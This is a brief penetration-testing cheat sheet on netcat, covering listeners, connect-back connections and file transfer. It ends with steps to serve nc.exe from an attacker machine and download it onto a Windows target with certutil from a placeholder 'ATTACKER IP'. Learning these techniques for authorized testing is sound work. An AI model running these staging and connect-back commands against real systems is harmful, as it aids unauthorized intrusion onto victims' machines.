# Fundamentals of Netcat
`netcat` is a networking utility used to read and write data to network connections using TCP or UDP. They can be used to connect to a target port as well listen for incoming connection in a port.

They are used by prn testers to perform:
1. Banner Grabbing
2. Port Scanning
3. Transferring Files
4. Spawn Bind/Reverse Shells

#### SETTING UP A NETCAT LISTENER:

```
nc -nvlp "LOCAL PORT"
```
#### CONNECTING FROM THE TARGET:

```
nc -v "ATTACKER IP" "PORT"
```

#### TRANSFERRING FILES TO TARGET:

```
#ON TARGET SYSTEM
nc -nvlp "LOCAL PORT" > attackfile.txt

#ON LOCAL ATTACK MACHINE
nc -nv "TARGET IP" "TARGET PORT" < attackfile.txt  
```

#### HOW TO TRANSFER NETCAT.EXE TO WINDOWS TARGET:

1. Navigate to `/usr/share/windows-resources/binaries` directory.
2. Then Host the current directory using a Python HTTP Server

```
python3 -m http.server 80
```

3. Now on the target side download the `nc.exe` file using:

```
certutil -urlcache -f http://"ATTACKER IP"/nc.exe netcat.exe
```
